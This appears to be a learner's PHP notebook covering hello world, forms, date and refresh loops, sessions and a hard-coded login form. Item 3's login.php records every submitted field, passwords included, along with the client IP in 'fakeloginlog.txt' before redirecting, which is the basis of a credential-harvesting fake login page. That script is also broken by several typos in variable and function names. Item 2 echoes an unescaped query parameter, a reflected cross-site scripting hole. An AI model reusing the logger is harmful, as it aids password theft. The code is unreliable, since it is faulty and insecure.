1. Our first hello world				php must be installed and files need .php even if mostly html
2. Our First form					php commends need to be in code <?php  #Comment ?>
3. PHP login script to use with form. 
4. Let's get some refreshed data                        Just use the ; at the end of each line. Save you some grief
5. Counter while and for
6. Utilize a var
7. Start session and sessions for php
8. about the ";" spaces and tabs
9. Form with hard coded username and password


1. Dependancies and lessons: 
php installed, files with php need .php, 
You will need php installed to see the Hello, World! code. 
If you look at the source you will see: <h2>h2 Hello, World!</h2>   as the php is rendered server side it is not visible to client machines. 
Your client browser will not let you open .php  However, if you select other app and select browser to force it, for me it just kept opening it continuously.
File needs file extention .php or if its .html it may send it to the client commented out. 
root@ubuntu:/var/www/html# cat index.php 
<!DOCTYPE html>
<html>
<head>
  <title>Look Up!</title>
</head>
<body>

<h1>This is a heading1</h1>
<h2>h2 
<?php
echo "Hello, World!" ?></h2>
<p>This is a paragraph.</p>

</body>
</html>


2. Not much PHP code
What we did learn is that PHP comments need to be between <?php and ?> or else it is in html and is viewable.

<!DOCTYPE html>
<html>
<head><title>LOGIN</title></head>
<body>

     <form action="login.php" method="post">  

        <h2>LOGIN</h2>

        <?php if (isset($_GET['error'])) { ?>    #PHP Comment

            <p class="error"><?php echo $_GET['error']; ?></p>

        <?php } ?> 

        <label>User Name</label>             

        <input type="text" name="uname" placeholder="User Name"><br>

        <label>Password</label>

        <input type="password" name="password" placeholder="Password"><br> 

        <button type="submit">Login</button>

     </form>
</body></html>


3.
login1.html:

<!DOCTYPE html>

<html>

<head>

    <title>LOGIN</title>

    <link rel="stylesheet" type="text/css" href="style.css">

</head>

<body>

     <form action="login.php" method="post">  

        <h2>LOGIN</h2>

	 <label>User Name</label>             

        <input type="text" name="uname" placeholder="User Name"><br>

        <label>Password</label>

        <input type="password" name="password" placeholder="Password"><br> 

        <button type="submit">Login</button>

     </form>

</body>

</html>




login.php:
<?php
// Get Client IP
if (!empty($_SEVER['HTTP_CLIENT_IP'])) { $ip_address = $_SERVER['HTTP_CLIENT_IP]; }
elseif ( !emptpy($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip_address = $_SERVER['HTTP_X_FORWADED_FOR']; }
else { $ip_address = $_SERVER['REMOTE_ADDR']; }

// Get POST data
$data= json_encoded($_POST);

//Log entry
$logentry = date("Y-m-d G:i:s")." - ".$ip_addresss." - ".$data;
file_put_contents("fakeloginlog.txt",$logentry.PHP_EOL, FILE_APPEND | LOCK_EX);
header('Location: ./index.html');
exit;
?>


4a get date working accordingly
date.php:
<!DOCTYPE html>
<html>
<head>
  <title>Look Up!</title>
</head>
<body>
<h2>h2
<?php
echo "<h3> It's ".date("l,  F Y h:i:s A")."<br>\r\n"

?>
</body>
</html>

4b Lets get it refreshing. 
header("Refresh: 3;");

Needs work:
#$page = $_SERVER['PHP_SELF']
#$sec = "10";
#header("Refresh: $sec; url=$page");

5.
$counter = 1;
while(...)# Why doesn't something like this work for a webpage say reloading?
{
    (...)
    $counter++;
}
$x=0;
while($x <= 5) {
  echo "<h3> It's ".date("l,  F Y h:i:s A")."<br>\r\n";
  header("Refresh: $x; url=http://localhost/date.php");
  $x++;
} #  This behavior is not what I expected, prints all at once and then refreshes at 5 seconds. 
  #  So, it iterates at 1 prints for it and iterates 2 and prints but does not timeout for refresh duhhh!
It's Friday, November 2022 01:19:51 PM
1
It's Friday, November 2022 01:19:51 PM
2
It's Friday, November 2022 01:19:51 PM
3
It's Friday, November 2022 01:19:51 PM
4
It's Friday, November 2022 01:19:51 PM
5 


<?php  # This is closer to what I was thinking
$x = 1;

while($x <= 5) {
  echo "<h3> It's ".date("l,  F Y h:i:s A")."<br>\r\n";
  header("Refresh: $x; url=http://localhost/date.php");
  echo $x;
  sleep($x);
  $x++;
}


It's Friday, November 2022 01:33:27 PM
1
It's Friday, November 2022 01:33:28 PM
2
It's Friday, November 2022 01:33:30 PM
3
It's Friday, November 2022 01:33:33 PM
4
It's Friday, November 2022 01:33:37 PM
5



for ($x = 0; $x<= 20;$x++) {
  echo "The number is: $x <br>";
}
for ($x = 0; $x= 20;$x++) {  # What do you think happends? x=20 and just continues and iterates. 
  echo "The number is: $x <br>";
}
    


6. 
$sec = 3;
header("Refresh: $sec; url=http://localhost/date.php");

7. 
session_start() # starts the session
$_SESSION       # to call the session

8.
It is very important to note that the line with the closing identifier must contain no other characters, except a semicolon (;). 
That means especially that the identifier may not be indented, and there may not be any spaces or tabs before or after the semicolon. 
It's also important to realize that the first character before the closing identifier must be a newline as defined by the local operating system. 
This is \n on UNIX systems, including Mac OS X. The closing delimiter must also be followed by a newline.

If this rule is broken and the closing identifier is not "clean", it will not be considered a closing identifier, 
and PHP will continue looking for one. If a proper closing identifier is not found before the end of the current file,
a parse error will result at the last line.

9.
<?php ob_start();session_start(); ?>
<html>
<head>
<title>Hardcoded Uname Pass</title>
</head>
<body>
<h1>Login</h1>
	<?php
	 $msg = '';
	 if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password']))
{
		if ($_POST['username'] == 'myname' && $_POST['password'] == 'mypass') {
		 echo 'You have entered a valid username and password';
} else {
	$msg = 'Wrong username or password';
	http_response_code(403);
}
	 }
?>
		<form action= <?php echo htmlspecialchars($_SERVER['PHP_SELF'])?> method = "post">
			<h4><?php echo $msg; ?></h4>
			<input type = "text" name="username" placeholder="Username"></br>
			<input type = "password" name="password" placeholder="Password"></br>
			<input type = "submit" name="login" placeholder="Login"></br>
			</form>
</body>
</html>
